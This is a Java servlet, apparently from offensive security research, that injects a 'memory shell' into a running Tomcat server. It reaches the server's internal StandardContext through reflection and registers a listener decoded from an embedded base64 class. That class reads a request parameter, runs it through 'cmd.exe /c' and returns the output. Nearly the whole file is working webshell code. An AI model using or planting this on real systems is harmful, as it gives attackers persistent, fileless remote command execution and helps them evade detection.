package com.listener;

import com.filter.DynamicUtils;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

public class AddListenerShell extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ServletContext servletContext = request.getServletContext();
        StandardContext standardContext = null;

        try {
            while (standardContext == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object obj = f.get(servletContext);

                if (obj instanceof ServletContext) {
                    servletContext = (ServletContext) obj;
                }
                if (obj instanceof StandardContext) {
                    standardContext = (StandardContext) obj;
                }
            }

            /*
            * 自定义Listener CMDListen执行命令
            * */

            String customListenPayload = "yv66vgAAADMAlgoAIQBGCgBHAEgHAEkIAEoLAAMASwoATABNBwBOCABPCABQCgBMAFEKAFIAUwcAVAoADABVCABWCgAMAFcKAAwAWAoADABZCABaCgAhAFsIADgKAFwAXQoAXgBfCgBeAGAHAGEKABgAYgoAYwBkCgBlAGYIAGcIAGgKAGUAaQcAagcAawcAbAcAbQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAaTGNvbS9saXN0ZW5lci9DTURMaXN0ZW5lcjsBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBABNzZXJ2bGV0UmVxdWVzdEV2ZW50AQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAB3NjYW5uZXIBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQAMcmVxdWVzdEZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAB3JlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBABJodHRwU2VydmxldFJlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAA1TdGFja01hcFRhYmxlBwBrBwBuBwBJBwBOBwBvBwBUBwBqAQAKU291cmNlRmlsZQEAEENNRExpc3RlbmVyLmphdmEMACMAJAcAbgwAcABxAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAAWMMAHIAcwcAdAwAdQB2AQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAdwB4BwB5DAB6AHsBABFqYXZhL3V0aWwvU2Nhbm5lcgwAIwB8AQACXEEMAH0AfgwAfwCADACBAIIBAAAMAIMAhAcAhQwAhgCHBwCIDACJAIoMAIsAjAEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QMAI0AjgcAjwwAkACRBwCSDACTAJQBAAEKAQAFZG9uZQoMAJUAJAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABhjb20vbGlzdGVuZXIvQ01ETGlzdGVuZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQATamF2YS9pby9JbnB1dFN0cmVhbQEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAAhACAAIQABACIAAAADAAEAIwAkAAEAJQAAAC8AAQABAAAABSq3AAGxAAAAAgAmAAAABgABAAAADAAnAAAADAABAAAABQAoACkAAAABACoAKwABACUAAAA1AAAAAgAAAAGxAAAAAgAmAAAABgABAAAAEAAnAAAAFgACAAAAAQAoACkAAAAAAAEALAAtAAEAAQAuACsAAQAlAAABmwAFAAkAAACwK7YAAsAAA00sEgS5AAUCAMYAmywSBLkABQIATrgABga9AAdZAxIIU1kEEglTWQUtU7YACrYACzoEuwAMWRkEtwANEg62AA86BRkFtgAQmQALGQW2ABGnAAUSEjoGLLYAExIUtgAVOgcZBwS2ABYZByy2ABfAABg6CBkItgAZtgAaGQa2ABsZCLYAGbYAGhIctgAbGQi2ABm2ABoSHbYAGxkItgAZtgAatgAepwAETrEAAQAIAKsArgAfAAMAJgAAAEIAEAAAABQACAAWABMAFwAcABgAOQAZAEkAGgBdABsAaAAcAG4AHQB5AB4AhgAfAJMAIACgACEAqwAmAK4AJACvACcAJwAAAFwACQAcAI8ALwAwAAMAOQByADEAMgAEAEkAYgAzADQABQBdAE4ANQAwAAYAaABDADYANwAHAHkAMgA4ADkACAAAALAAKAApAAAAAACwACwALQABAAgAqAA6ADsAAgA8AAAAJwAF/wBZAAYHAD0HAD4HAD8HAEAHAEEHAEIAAEEHAED4AE9CBwBDAAABAEQAAAACAEU=";

//            standardContext.addApplicationEventListener(DynamicUtils.getClass(DynamicUtils.LISTENER_CLASS_STRING).newInstance());
            standardContext.addApplicationEventListener(DynamicUtils.getClass(customListenPayload).newInstance());
            response.getWriter().write("add new listener");
            response.getWriter().write("\ndone");
            response.getWriter().flush();

        } catch (Exception e) {

        }
    }
}
